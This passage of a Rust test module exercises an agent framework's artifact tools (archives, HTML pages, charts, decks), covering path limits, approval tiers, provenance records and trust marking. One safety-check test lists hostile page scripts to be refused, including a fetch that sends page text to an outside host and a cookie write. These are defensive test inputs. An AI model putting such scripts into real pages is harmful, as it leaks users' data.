                "subtitle": {"type": "string"},
                "author": {"type": "string"},
                "slides": {"type": "array", "minItems": 1, "maxItems": 60, "items": {"type": "object", "required": ["title"], "properties": {"title": {"type": "string"}, "body_md": {"type": "string"}, "blocks": {"type": "array", "items": {"type": "object"}}, "chart": {"type": "object"}, "notes": {"type": "string"}}}},
                "theme": {"type": "string", "enum": ["auto", "light", "dark"]}
            }}),
        },
        requires_write_scope: true,
        classify: |tool, args| classify(tool, args),
        exec: ToolExec::Local(write_deck),
    },
]
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::probe::AssumeClean;
    use crate::tools::Registry;
    use delphi_core::pathguard::Zones;
    use delphi_core::provenance::{Index, OriginRules, Span};
    use std::collections::HashSet;
    use std::fs;

    struct Fx {
        _t: tempfile::TempDir,
        root: std::path::PathBuf,
        guard: Guard,
        span: Span,
        index: Index,
        rules: OriginRules,
    }

    fn fx(write_globs: &[&str]) -> Fx {
        let t = tempfile::tempdir().unwrap();
        let r = t.path();
        for d in ["local/missions/m1", "team/specs", "ratified", "base", "proj/src", "proj/vendor/lib", "wt/out"] {
            fs::create_dir_all(r.join(d)).unwrap();
        }
        fs::write(r.join("proj/src/lib.rs"), "fn a() {}\n").unwrap();
        fs::write(r.join("proj/src/other.rs"), "fn b() {}\n").unwrap();
        fs::write(r.join("proj/vendor/lib/x.js"), "vendored code\n").unwrap();
        fs::write(r.join("local/missions/m1/notes.md"), "---\nid: n\n---\nnotes\n").unwrap();
        let guard = Guard {
            zones: Zones { local: r.join("local"), team: r.join("team"), base: r.join("base"), ratified: r.join("ratified"), worktree: Some(r.join("wt")), projects: vec![("app".into(), r.join("proj"))], payload: None },
            role: "architect".into(),
            read_globs: vec!["*".into()],
            write_globs: write_globs.iter().map(|s| s.to_string()).collect(),
            protected: HashSet::new(),
        };
        Fx { root: r.to_path_buf(), _t: t, guard, span: Span::root("sp1"), index: Index::new(), rules: OriginRules::with_defaults() }
    }

    fn run(f: &mut Fx, args: Value) -> (ToolResult, Vec<Stamp>) {
        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "2026-10-25T12:00:00.000Z", stamps: vec![] };
        let r = Registry::builtin().run(&mut ctx, "write_archive", &args);
        (r, std::mem::take(&mut ctx.stamps))
    }

    fn doc_names(bytes: &[u8]) -> String {
        delphi_docs::extract(bytes, "x.zip", &delphi_docs::Request::default(), &delphi_docs::Limits::default()).unwrap().text
    }

    #[test]
    fn paths_resolve_to_the_mission_artifacts_directory_and_everything_else_is_refused() {
        let r = |p: &str| resolve_path(Some("missions/m1/artifacts"), p, "write_archive");
        assert_eq!(r("bundle").unwrap(), "missions/m1/artifacts/bundle.zip");
        assert_eq!(r("./out/bundle.ZIP").unwrap(), "missions/m1/artifacts/out/bundle.ZIP");
        assert_eq!(r("missions/m2/artifacts/x.zip").unwrap(), "missions/m2/artifacts/x.zip");
        assert_eq!(r("@worktree/docs/x.zip").unwrap(), "@worktree/docs/x.zip");
        for bad in ["", "../x.zip", "a/../b.zip", "a//b.zip", "a\\b.zip", "/abs.zip", "~/x.zip", "@project/app/x.zip", "specs/x.zip", "skills/x.zip", "agents/x.zip", "bundle.txt", "x.provenance.md", "missions/m1/x.provenance.md"] {
            assert!(r(bad).is_err(), "{:?} was accepted: {:?}", bad, r(bad));
        }
        let base = Some("missions/m1/artifacts");
        assert_eq!(sidecar_path(base, "missions/m1/artifacts/x.zip").as_deref(), Some("missions/m1/artifacts/x.zip.provenance.md"));
        assert_eq!(sidecar_path(base, "@worktree/docs/x.zip").as_deref(), Some("missions/m1/artifacts/provenance/worktree__docs__x.zip.provenance.md"));
        assert_eq!(sidecar_path(None, "@worktree/docs/x.zip"), None);
        assert!(resolve_path(None, "plain.zip", "write_archive").unwrap_err().contains("nowhere to go"));
        assert_eq!(resolve_path(None, "@worktree/x.zip", "write_archive").unwrap(), "@worktree/x.zip");
    }

    #[test]
    fn classification_is_green_in_the_mission_and_amber_in_a_worktree_and_binds_the_arguments() {
        let reg = Registry::builtin();
        let c = reg.classify("write_archive", &json!({"path": "evidence.zip", "members": ["@project/app/src/lib.rs"]})).unwrap();
        assert_eq!((c.tier, c.kind), (ToolTier::Green, ActionKind::MissionArtifact));
        assert!(c.summary.contains("a zip of 1 file") && c.payload["members"][0] == "@project/app/src/lib.rs" && c.payload["args_blake3"].as_str().unwrap().len() == 64, "{:?}", c);
        let w = reg.classify("write_archive", &json!({"path": "@worktree/out/x.zip", "members": ["a", "b"]})).unwrap();
        assert_eq!((w.tier, w.kind, w.pattern.as_str()), (ToolTier::Amber, ActionKind::WorktreeEdit, "write_archive @worktree/out/*"));
        let other = reg.classify("write_archive", &json!({"path": "evidence.zip", "members": ["different"]})).unwrap();
        assert_ne!(c.payload["args_blake3"], other.payload["args_blake3"]);
        for bad in [json!({"path": "specs/x.zip", "members": ["a"]}), json!({"path": "x.zip", "members": []}), json!({"path": "x.zip"}), json!({"path": "x.zip", "members": [""]}), json!({"members": ["a"]}), json!({"path": "x.zip", "members": vec!["a"; 201]})] {
            assert!(reg.classify("write_archive", &bad).is_err(), "{} was accepted", bad);
        }
    }

    #[test]
    fn an_archive_is_written_with_a_provenance_record_and_both_are_stamped() {
        let mut f = fx(&["missions/**"]);
        let (r, stamps) = run(&mut f, json!({"path": "bundle", "members": ["@project/app/src/lib.rs", "@project/app/src/other.rs", "missions/m1/notes.md"]}));
        assert!(!r.is_error, "{}", r.content);
        assert!(r.content.starts_with("created missions/m1/artifacts/bundle.zip (") && r.content.contains("tier L3") && r.content.contains("provenance record: missions/m1/artifacts/bundle.zip.provenance.md"), "{}", r.content);
        let zip = fs::read(f.root.join("local/missions/m1/artifacts/bundle.zip")).unwrap();
        let listing = doc_names(&zip);
        assert!(listing.contains("project/app/src/lib.rs") && listing.contains("project/app/src/other.rs") && listing.contains("missions/m1/notes.md") && !listing.contains("@project"), "{}", listing);
        let side = fs::read_to_string(f.root.join("local/missions/m1/artifacts/bundle.zip.provenance.md")).unwrap();
        let hash = blake3::hash(&zip).to_hex().to_string();
        assert!(side.contains(&format!("artifact_blake3: {}", hash)) && side.contains(&format!("artifact_bytes: {}", zip.len())) && side.contains("author: architect") && side.contains("source_type: internal_generated") && side.contains("source_mission: m1"), "{}", side);
        assert!(side.contains("- @project/app/src/lib.rs (10 bytes, blake3 ") && side.contains("# Provenance of bundle.zip"), "{}", side);
        assert_eq!(stamps.len(), 2);
        assert_eq!(stamps[0].blake3, hash);
        assert!(stamps.iter().all(|s| s.tier == Tier::L3) && stamps[1].path.ends_with("bundle.zip.provenance.md"), "{:?}", stamps);
        // writing it again says so
        let (again, _) = run(&mut f, json!({"path": "bundle", "members": ["@project/app/src/lib.rs"]}));
        assert!(again.content.starts_with("replaced "), "{}", again.content);
    }

    #[test]
    fn an_archive_of_untrusted_files_is_untrusted() {
        let mut f = fx(&["missions/**"]);
        let (r, stamps) = run(&mut f, json!({"path": "mixed.zip", "members": ["@project/app/src/lib.rs", "@project/app/vendor/lib/x.js"]}));
        assert!(!r.is_error && r.content.contains("tier L0 external_untrusted"), "{}", r.content);
        assert_eq!(f.span.ceiling(), Tier::L0);
        assert!(stamps.iter().all(|s| s.tier == Tier::L0), "{:?}", stamps);
        let side = fs::read_to_string(f.root.join("local/missions/m1/artifacts/mixed.zip.provenance.md")).unwrap();
        assert!(side.contains("artifact_tier: L0 external_untrusted") && side.contains("Trust: L0 external_untrusted."), "{}", side);
    }

    #[test]
    fn what_cannot_succeed_is_refused_before_anything_is_written() {
        // no write scope at all
        let mut f = fx(&[]);
        let (r, stamps) = run(&mut f, json!({"path": "x.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(r.is_error && r.content.contains("nowhere to go") && stamps.is_empty(), "{}", r.content);
        assert!(!f.root.join("local/missions/m1/artifacts").exists());
        // scope for the archive but not for its provenance record
        let mut f = fx(&["missions/m1/artifacts/*.zip"]);
        let (r, _) = run(&mut f, json!({"path": "x.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(r.is_error, "{}", r.content);
        assert!(!f.root.join("local/missions/m1/artifacts/x.zip").exists(), "no archive without its record");
        // a member outside the read scope, or a missing one, or the same file twice
        let mut f = fx(&["missions/**"]);
        f.guard.read_globs = vec!["@project/**".into()];
        let (r, _) = run(&mut f, json!({"path": "x.zip", "members": ["missions/m1/notes.md"]}));
        assert!(r.is_error && r.content.contains("outside your role's access scope"), "{}", r.content);
        let (r, _) = run(&mut f, json!({"path": "x.zip", "members": ["@project/app/src/nope.rs"]}));
        assert!(r.is_error && r.content.contains("not found"), "{}", r.content);
        let (r, _) = run(&mut f, json!({"path": "x.zip", "members": ["@project/app/src/lib.rs", "@project/app/src/lib.rs"]}));
        assert!(r.is_error && r.content.contains("twice"), "{}", r.content);
        assert!(!f.root.join("local/missions/m1/artifacts/x.zip").exists());
    }

    #[test]
    fn the_size_cap_applies_to_what_goes_in() {
        let mut f = fx(&["missions/**"]);
        fs::write(f.root.join("proj/src/big1.bin"), vec![7u8; 3 << 20]).unwrap();
        fs::write(f.root.join("proj/src/big2.bin"), vec![8u8; 3 << 20]).unwrap();
        let (r, _) = run(&mut f, json!({"path": "big.zip", "members": ["@project/app/src/big1.bin", "@project/app/src/big2.bin"]}));
        assert!(r.is_error && r.content.contains("more than 4194304 bytes"), "{}", r.content);
        let (one, _) = run(&mut f, json!({"path": "big.zip", "members": ["@project/app/src/big1.bin"]}));
        assert!(!one.is_error, "{}", one.content);
        // the cap on the output itself
        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "t", stamps: vec![] };
        let target = Target { path: "missions/m1/artifacts/huge.zip".into(), sidecar: None };
        let r = write_artifact(&mut ctx, &target, &vec![0u8; MAX_ARTIFACT_BYTES + 1], "write_archive", &[]);
        assert!(r.is_error && r.content.contains("limit is 4194304"), "{}", r.content);
    }

    #[test]
    fn a_worktree_artifact_keeps_its_provenance_record_with_the_mission_not_in_the_repository() {
        let mut f = fx(&["missions/**", "@worktree/**"]);
        let (r, stamps) = run(&mut f, json!({"path": "@worktree/out/bundle.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(!r.is_error, "{}", r.content);
        assert!(f.root.join("wt/out/bundle.zip").exists());
        assert!(!f.root.join("wt/out/bundle.zip.provenance.md").exists(), "nothing but the deliverable lands in the worktree");
        assert!(f.root.join("local/missions/m1/artifacts/provenance/worktree__out__bundle.zip.provenance.md").exists());
        assert_eq!(stamps.len(), 2);
    }

    #[test]
    fn a_plain_path_goes_where_this_roles_manifest_allows_and_nowhere_else() {
        // the architect's scope: research and specs subfolders of a mission, not artifacts/
        let mut f = fx(&["missions/**/research/**", "missions/**/specs/**"]);
        assert_eq!(default_dir(&f.guard, "m1").as_deref(), Some("missions/m1/research"));
        let (r, stamps) = run(&mut f, json!({"path": "evidence.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(!r.is_error && r.content.contains("created missions/m1/research/evidence.zip") && r.content.contains("evidence.zip.provenance.md"), "{}", r.content);
        assert_eq!(stamps.len(), 2);
        // a role with an artifacts folder uses it, ahead of the others
        let f2 = fx(&["missions/**"]);
        assert_eq!(default_dir(&f2.guard, "m1").as_deref(), Some("missions/m1/artifacts"));
        // the builder: only the worktree. A plain path has nowhere to go; a worktree path works, with no record file.
        let mut b = fx(&["@worktree/**"]);
        assert_eq!(default_dir(&b.guard, "m1"), None);
        let (r, _) = run(&mut b, json!({"path": "plain.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(r.is_error && r.content.contains("nowhere to go"), "{}", r.content);
        let (r, stamps) = run(&mut b, json!({"path": "@worktree/out/bundle.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(!r.is_error && r.content.contains("no provenance record file") && r.content.contains("the stamp is in the mission log"), "{}", r.content);
        assert!(b.root.join("wt/out/bundle.zip").exists() && !b.root.join("wt/out/bundle.zip.provenance.md").exists());
        assert_eq!(stamps.len(), 1, "the archive itself is still stamped");
        // and a role with no write scope at all is refused whatever the path
        let mut none = fx(&[]);
        let (r, _) = run(&mut none, json!({"path": "@worktree/x.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(r.is_error, "{}", r.content);
    }

    #[tokio::test]
    async fn through_the_engine_a_mission_artifact_needs_no_card_and_its_stamps_are_logged() {
        use crate::engine::Status;
        use crate::model::Step;
        use crate::testkit::{events_of, ratify_spec, setup};
        let f = setup(vec![Step::tool("a1", "write_archive", json!({"path": "evidence.zip", "members": ["specs/011-retry.md"]})), Step::text("Bundled it.")], 5.0, |_| {});
        ratify_spec(&f);
        let out = f.engine.run_task(&f.m, "architect", "Bundle the retry spec as evidence").await.unwrap();
        assert_eq!(out.status, Status::Done);
        assert!(events_of(&f, "approval.requested").is_empty() && f.engine.broker.pending().is_empty(), "a mission artifact is Green: nobody is asked");
        let zip = f.root.join(format!("workspaces/w/local/missions/{}/research/evidence.zip", f.m.id));
        assert!(zip.exists(), "the architect's manifest allows research/, so a plain path lands there");
        assert!(delphi_docs::extract(&std::fs::read(&zip).unwrap(), "evidence.zip", &delphi_docs::Request::default(), &delphi_docs::Limits::default()).unwrap().text.contains("specs/011-retry.md"));
        let stamped: Vec<String> = events_of(&f, "provenance.stamp").iter().map(|e| e.payload["path"].as_str().unwrap_or("").to_string()).collect();
        assert!(stamped.iter().any(|p| p.ends_with("research/evidence.zip")) && stamped.iter().any(|p| p.ends_with("research/evidence.zip.provenance.md")), "{:?}", stamped);
        let told = f.model.requests()[1].body["messages"].to_string();
        assert!(told.contains("created missions/") && told.contains("evidence.zip"), "{}", told);
    }

    #[tokio::test]
    async fn through_the_engine_a_refusal_comes_back_before_any_card_and_writes_nothing() {
        use crate::model::Step;
        use crate::testkit::{events_of, ratify_spec, setup};
        // the architect may not write into another zone, and `specs/…` is not an artifact folder
        let f = setup(vec![Step::tool("a1", "write_archive", json!({"path": "specs/x.zip", "members": ["specs/011-retry.md"]})), Step::text("Understood.")], 5.0, |_| {});
        ratify_spec(&f);
        f.engine.run_task(&f.m, "architect", "Try a bad path").await.unwrap();
        assert!(events_of(&f, "approval.requested").is_empty() && events_of(&f, "provenance.stamp").is_empty());
        let told = f.model.requests()[1].body["messages"].to_string();
        assert!(told.contains("an artifact is written into the mission"), "{}", told);
    }

    fn run_tool(f: &mut Fx, tool: &str, args: Value) -> (ToolResult, Vec<Stamp>) {
        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "2026-10-25T12:00:00.000Z", stamps: vec![] };
        let r = Registry::builtin().run(&mut ctx, tool, &args);
        (r, std::mem::take(&mut ctx.stamps))
    }

    fn page_args() -> Value {
        json!({"title": "Q3 review", "blocks": [
            {"type": "markdown", "text": "# Summary\n\nRevenue **grew**."},
            {"type": "table", "columns": ["Region", "Q3"], "rows": [["North", 120], ["South", 95]], "sortable": true, "filter": true},
            {"type": "tabs", "tabs": [{"title": "Plan", "blocks": [{"type": "callout", "text": "Do it."}]}]}
        ], "path": "report"})
    }

    #[test]
    fn a_page_is_written_checked_stamped_and_marked_with_its_trust() {
        let mut f = fx(&["missions/**"]);
        let (r, stamps) = run_tool(&mut f, "write_html", page_args());
        assert!(!r.is_error && r.content.starts_with("created missions/m1/artifacts/report.html (") && r.content.contains("tier L3"), "{}", r.content);
        let html = fs::read_to_string(f.root.join("local/missions/m1/artifacts/report.html")).unwrap();
        assert!(html.starts_with("<!doctype html>\n<!-- delphi artifact: written by role architect in mission m1 with write_html at 2026-10-25T12:00:00.000Z; trust L3 internal_generated; provenance record: report.html.provenance.md -->\n<html"), "{}", &html[..260]);
        assert!(delphi_docs::htmllint::lint(&html).is_empty());
        let side = fs::read_to_string(f.root.join("local/missions/m1/artifacts/report.html.provenance.md")).unwrap();
        assert!(side.contains(&format!("artifact_blake3: {}", blake3::hash(html.as_bytes()).to_hex())) && side.contains("- title: Q3 review") && side.contains("- free-form script: no") && side.contains("produced_by: write_html"), "{}", side);
        assert_eq!(stamps.len(), 2);
        // it reads back through the same tools
        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "t", stamps: vec![] };
        let back = Registry::builtin().run(&mut ctx, "read_doc", &json!({"path": "missions/m1/artifacts/report.html"}));
        assert!(back.content.contains("# Q3 review") && back.content.contains("| North | 120 |"), "{}", back.content);
    }

    #[test]
    fn a_page_written_after_reading_untrusted_input_says_so_in_the_file() {
        let mut f = fx(&["missions/**"]);
        f.span.observe_input(Tier::L0);
        let (r, stamps) = run_tool(&mut f, "write_html", page_args());
        assert!(!r.is_error && r.content.contains("tier L0 external_untrusted"), "{}", r.content);
        let html = fs::read_to_string(f.root.join("local/missions/m1/artifacts/report.html")).unwrap();
        assert!(html.contains("trust L0 external_untrusted"), "{}", &html[..260]);
        assert!(stamps.iter().all(|s| s.tier == Tier::L0));
    }

    #[test]
    fn a_scripted_page_is_never_auto_approved_and_an_unscripted_one_is_as_green_as_any_mission_artifact() {
        let reg = Registry::builtin();
        let plain = reg.classify("write_html", &page_args()).unwrap();
        assert_eq!((plain.tier, plain.kind), (ToolTier::Green, ActionKind::MissionArtifact));
        let mut wt = page_args();
        wt["path"] = json!("@worktree/docs/report.html");
        let w = reg.classify("write_html", &wt).unwrap();
        assert_eq!((w.tier, w.kind), (ToolTier::Amber, ActionKind::WorktreeEdit));
        let mut scripted = page_args();
        scripted["script"] = json!("document.title = 'ready';");
        let c = reg.classify("write_html", &scripted).unwrap();
        assert_eq!((c.tier, c.kind), (ToolTier::Amber, ActionKind::SpecDraft), "no permission mode approves SpecDraft");
        assert_eq!(c.payload["script"], "document.title = 'ready';", "the card shows the script in full");
        assert!(c.summary.contains("WITH A SCRIPT") && c.pattern.starts_with("write_html script "), "{:?}", c);
        // the same, in a worktree: still always asks
        scripted["path"] = json!("@worktree/docs/report.html");
        assert_eq!(reg.classify("write_html", &scripted).unwrap().kind, ActionKind::SpecDraft);
        // "allow similar" is for this exact script only
        let mut other = page_args();
        other["script"] = json!("document.title = 'different';");
        assert_ne!(c.pattern, reg.classify("write_html", &other).unwrap().pattern);
    }

    #[test]
    fn a_page_that_would_fail_its_safety_check_is_refused_before_anyone_is_asked() {
        let reg = Registry::builtin();
        for (script, expect) in [("fetch('https://e.com/?' + document.body.textContent);", "fetch"), ("location = 'https://e.com';", "location"), ("var s = 'https://e.com';", "https:"), ("eval(x);", "eval")] {
            let mut a = page_args();
            a["script"] = json!(script);
            let e = reg.classify("write_html", &a).unwrap_err();
            assert!(e.0.contains("safety check") && e.0.contains(expect), "{}: {}", script, e);
        }
        for bad in [json!({"path": "r", "blocks": [{"type": "markdown", "text": "x"}]}), json!({"path": "r", "title": "T"}), json!({"path": "r", "title": "T", "blocks": [{"type": "video"}]}), json!({"path": "r.txt", "title": "T", "body_md": "x"}), json!({"path": "specs/r.html", "title": "T", "body_md": "x"})] {
            assert!(reg.classify("write_html", &bad).is_err(), "{} was accepted", bad);
        }
        let mut f = fx(&["missions/**"]);
        let mut a = page_args();
        a["script"] = json!("document.cookie = 'x';");
        let (r, stamps) = run_tool(&mut f, "write_html", a);
        assert!(r.is_error && r.content.contains("cookie") && stamps.is_empty(), "{}", r.content);
        assert!(!f.root.join("local/missions/m1/artifacts/report.html").exists());
    }

    async fn pending_card(f: &crate::testkit::Fx) -> Option<crate::approval::Request> {
        for _ in 0..80 {
            if let Some(c) = f.engine.broker.pending().into_iter().next() {
                return Some(c);
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        None
    }

    #[tokio::test]
    async fn through_the_engine_even_the_most_permissive_mode_asks_about_a_script_and_a_denial_writes_nothing() {
        use crate::approval::{Answer, Mode};
        use crate::model::Step;
        use crate::testkit::{events_of, setup};
        let page = |script: Option<&str>| {
            let mut a = json!({"path": "page.html", "title": "T", "body_md": "hello"});
            if let Some(s) = script {
                a["script"] = json!(s);
            }
            a
        };
        // a page without a script: Green, no card
        let f = setup(vec![Step::tool("a1", "write_html", page(None)), Step::text("Done.")], 5.0, |_| {});
        f.engine.broker.set_mode(Mode::MissionAuto);
        f.engine.run_task(&f.m, "architect", "Make a page").await.unwrap();
        assert!(events_of(&f, "approval.requested").is_empty());
        assert!(f.root.join(format!("workspaces/w/local/missions/{}/research/page.html", f.m.id)).exists());
        // a page with a script: a card in the most permissive mode, showing the script; denied, so nothing is written
        let f = setup(vec![Step::tool("a1", "write_html", page(Some("document.title = 'x';"))), Step::text("Understood.")], 5.0, |_| {});
        f.engine.broker.set_mode(Mode::Optimistic);
        let (e, m) = (f.engine.clone(), f.m.clone());
        let task = tokio::spawn(async move { e.run_task(&m, "architect", "Make a scripted page").await });
        let c = pending_card(&f).await.expect("a scripted page always asks");
        assert_eq!(c.tool, "write_html");
        assert!(c.summary.contains("WITH A SCRIPT") && c.payload["script"] == "document.title = 'x';", "{:?}", c);
        f.engine.broker.resolve(&c.approval_id, &c.payload_blake3, Answer::Deny { reason: "not today".into() }, "console-1").unwrap();
        task.await.unwrap().unwrap();
        assert!(!f.root.join(format!("workspaces/w/local/missions/{}/research/page.html", f.m.id)).exists());
        assert!(f.model.requests()[1].body["messages"].to_string().contains("not today") || f.model.requests()[1].body["messages"].to_string().contains("denied"));
    }

    fn chart_args() -> Value {
        json!({"path": "latency", "type": "line", "title": "Median latency fell 12% in 0.2.3", "x": "release", "y": ["p50", "p95"], "x_order": "ordered",
               "data": {"columns": ["release", "p50", "p95"], "rows": [["0.2.1", 120, 340], ["0.2.2", 118, 310], ["0.2.3", 104, 255]]}})
    }

    #[test]
    fn a_chart_is_drawn_marked_with_its_trust_and_recorded() {
        let mut f = fx(&["missions/**"]);
        let (r, stamps) = run_tool(&mut f, "write_chart", chart_args());
        assert!(!r.is_error && r.content.starts_with("created missions/m1/artifacts/latency.svg (") && r.content.contains("tier L3"), "{}", r.content);
        let svg = fs::read_to_string(f.root.join("local/missions/m1/artifacts/latency.svg")).unwrap();
        assert!(svg.starts_with("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- delphi artifact: written by role architect in mission m1 with write_chart at 2026-10-25T12:00:00.000Z; trust L3 internal_generated; provenance record: latency.svg.provenance.md -->\n<svg "), "{}", &svg[..300]);
        assert!(svg.contains("<title id=\"chart-title\">Median latency fell 12% in 0.2.3</title>") && !svg.contains("<script"), "no script in a chart");
        let side = fs::read_to_string(f.root.join("local/missions/m1/artifacts/latency.svg.provenance.md")).unwrap();
        assert!(side.contains("- line chart: 2 series, 3 points") && side.contains("produced_by: write_chart"), "{}", side);
        assert_eq!(stamps.len(), 2);
    }

    #[test]
    fn a_chart_that_does_not_fit_its_data_is_refused_before_anyone_is_asked_with_a_better_form() {
        let reg = Registry::builtin();
        let mut pie = chart_args();
        pie["type"] = json!("pie");
        assert!(reg.classify("write_chart", &pie).unwrap_err().0.contains("use `hbar`"));
        let mut one = chart_args();
        one["type"] = json!("bar");
        one["data"] = json!({"columns": ["k", "v"], "rows": [["only", 5]]});
        one["x"] = json!("k");
        one["y"] = json!("v");
        assert!(reg.classify("write_chart", &one).unwrap_err().0.contains("just a number"));
        let mut png = chart_args();
        png["path"] = json!("latency.png");
        assert!(reg.classify("write_chart", &png).unwrap_err().0.contains("PNG output is not available yet"));
        let mut fmt = chart_args();
        fmt["format"] = json!("png");
        assert!(reg.classify("write_chart", &fmt).unwrap_err().0.contains("PNG"));
        // classification: Green in the mission, Amber in a worktree, with the arguments bound
        let c = reg.classify("write_chart", &chart_args()).unwrap();
        assert_eq!((c.tier, c.kind), (ToolTier::Green, ActionKind::MissionArtifact));
        assert!(c.summary.contains("a line chart") && c.payload["series"] == 2 && c.payload["rows"] == 3 && c.payload["args_blake3"].as_str().unwrap().len() == 64, "{:?}", c);
        let mut wt = chart_args();
        wt["path"] = json!("@worktree/docs/latency.svg");
        assert_eq!(reg.classify("write_chart", &wt).unwrap().kind, ActionKind::WorktreeEdit);
        let mut f = fx(&["missions/**"]);
        let (r, stamps) = run_tool(&mut f, "write_chart", pie);
        assert!(r.is_error && stamps.is_empty() && !f.root.join("local/missions/m1/artifacts").exists(), "{}", r.content);
    }

    #[test]
    fn data_read_from_a_file_has_its_trust_printed_under_the_chart_and_taints_the_span() {
        let mut f = fx(&["missions/**"]);
        fs::write(f.root.join("proj/src/latency.csv"), "release,p50,p95\n0.2.1,120,340\n0.2.2,118,310\n0.2.3,104,255\n").unwrap();
        fs::write(f.root.join("proj/vendor/lib/latency.csv"), "release,p50,p95\n0.2.1,1,2\n0.2.2,3,4\n").unwrap();
        let from = |path: &str| json!({"path": "chart", "type": "line", "title": "T", "x_order": "ordered", "data": {"from": path}});
        let (r, _) = run_tool(&mut f, "write_chart", from("@project/app/src/latency.csv"));
        assert!(!r.is_error && r.content.contains("tier L3"), "{}", r.content);
        let svg = fs::read_to_string(f.root.join("local/missions/m1/artifacts/chart.svg")).unwrap();
        assert!(svg.contains("Source: data: @project/app/src/latency.csv (trust L4 internal_empirical)") && svg.contains(">p95  255</text>"), "{}", &svg[svg.len().saturating_sub(700)..]);
        assert_eq!(f.span.ceiling(), Tier::L5, "a project file at its base commit is local input");
        // an untrusted file: the chart says so, and so does its stamp
        let (r, stamps) = run_tool(&mut f, "write_chart", from("@project/app/vendor/lib/latency.csv"));
        assert!(!r.is_error && r.content.contains("tier L0 external_untrusted"), "{}", r.content);
        let svg = fs::read_to_string(f.root.join("local/missions/m1/artifacts/chart.svg")).unwrap();
        assert!(svg.contains("(trust L0 external_untrusted)") && svg.contains("trust L0 external_untrusted"), "{}", &svg[svg.len().saturating_sub(300)..]);
        assert_eq!(f.span.ceiling(), Tier::L0);
        assert!(stamps.iter().all(|s| s.tier == Tier::L0));
        // a given source is kept beside it
        let mut with_source = from("@project/app/src/latency.csv");
        with_source["source"] = json!("weekly dashboard export");
        let (r, _) = run_tool(&mut f, "write_chart", with_source);
        assert!(!r.is_error);
        assert!(fs::read_to_string(f.root.join("local/missions/m1/artifacts/chart.svg")).unwrap().contains("Source: weekly dashboard export · data: @project/app/src/latency.csv"));
    }

    #[test]
    fn data_files_that_cannot_be_charted_say_why() {
        let mut f = fx(&["missions/**"]);
        fs::write(f.root.join("proj/src/notes.md"), "# not data\n").unwrap();
        fs::write(f.root.join("proj/src/one.csv"), "a,b\n").unwrap();
        let from = |p: &str| json!({"path": "c", "type": "bar", "title": "T", "data": {"from": p}});
        for (path, expect) in [("@project/app/src/notes.md", "reads .csv and .tsv"), ("@project/app/src/one.csv", "header row and at least one row"), ("@project/app/src/missing.csv", "not found")] {
            let (r, stamps) = run_tool(&mut f, "write_chart", from(path));
            assert!(r.is_error && r.content.contains(expect) && stamps.is_empty(), "{}: {}", path, r.content);
        }
        // outside the role's read scope
        f.guard.read_globs = vec!["missions/**".into()];
        let (r, _) = run_tool(&mut f, "write_chart", from("@project/app/src/one.csv"));
        assert!(r.is_error && r.content.contains("outside your role's access scope"), "{}", r.content);
        assert!(!f.root.join("local/missions/m1/artifacts/c.svg").exists());
    }

    #[tokio::test]
    async fn through_the_engine_a_chart_needs_no_card_and_reaches_the_model() {
        use crate::engine::Status;
        use crate::model::Step;
        use crate::testkit::{events_of, setup};
        let f = setup(vec![Step::tool("a1", "write_chart", chart_args()), Step::text("Charted.")], 5.0, |_| {});
        let out = f.engine.run_task(&f.m, "architect", "Chart the latency").await.unwrap();
        assert_eq!(out.status, Status::Done);
        assert!(events_of(&f, "approval.requested").is_empty());
        let svg = f.root.join(format!("workspaces/w/local/missions/{}/research/latency.svg", f.m.id));
        assert!(svg.exists() && fs::read_to_string(svg).unwrap().contains("Median latency fell 12% in 0.2.3"));
        assert!(f.model.requests()[1].body["messages"].to_string().contains("created missions/"));
    }

    #[test]
    fn the_tool_is_offered_only_to_roles_with_a_write_scope_and_its_output_reads_back_through_read_doc() {
        assert!(!Registry::builtin().defs(false).iter().any(|d| d.name == "write_archive"));
        assert!(Registry::builtin().defs(true).iter().any(|d| d.name == "write_archive"));
        let mut f = fx(&["missions/**"]);
        let (r, _) = run(&mut f, json!({"path": "evidence.zip", "members": ["@project/app/src/lib.rs"]}));
        assert!(!r.is_error, "{}", r.content);
        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "t", stamps: vec![] };
        let back = Registry::builtin().run(&mut ctx, "read_doc", &json!({"path": "missions/m1/artifacts/evidence.zip", "member": "project/app/src/lib.rs"}));
        assert!(!back.is_error && back.content.contains("fn a() {}"), "{}", back.content);
    }
    fn chart_block(from: Option<&str>) -> Value {
        let data = match from {
            Some(f) => json!({"from": f}),
            None => json!({"columns": ["release", "p50", "p95"], "rows": [["0.2.1", 120, 340], ["0.2.2", 118, 310], ["0.2.3", 104, 255]]}),
        };
        json!({"type": "line", "title": "Latency fell", "x_order": "ordered", "data": data})
    }

    fn deck_args(from: Option<&str>) -> Value {
        json!({"path": "roadmap", "title": "Roadmap", "slides": [{"title": "Where we are", "body_md": "- fast", "notes": "Say hello."}, {"title": "Latency", "chart": chart_block(from)}]})
    }

    fn report_args(from: Option<&str>) -> Value {
        json!({"path": "q3", "title": "Q3", "sections": [{"heading": "Latency", "blocks": [{"type": "chart", "chart": chart_block(from), "caption": "p50 and p95"}]}]})
    }

    #[test]
    fn a_deck_and_a_report_are_written_checked_stamped_and_read_back() {
        let mut f = fx(&["missions/**"]);
